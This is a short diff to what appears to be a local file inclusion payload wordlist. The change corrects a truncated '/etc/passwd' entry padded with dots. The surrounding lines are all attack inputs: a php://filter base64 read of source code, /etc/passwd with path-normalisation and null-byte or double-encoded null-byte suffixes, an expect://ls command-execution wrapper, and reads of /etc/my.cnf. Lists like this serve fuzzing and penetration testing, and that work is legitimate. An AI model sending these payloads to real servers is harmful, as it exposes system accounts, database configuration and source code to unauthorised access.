@@ -6,7 +6,7 @@ php://filter/convert.base64-encode/resource=index
 /etc/passwd/././
 /etc/passwd%00
 /etc/passwd%2500
-tc/passwd........................................................................................
+/etc/passwd........................................................................................
 expect://ls
 /etc/my.cnf
 /etc/my.cnf%00
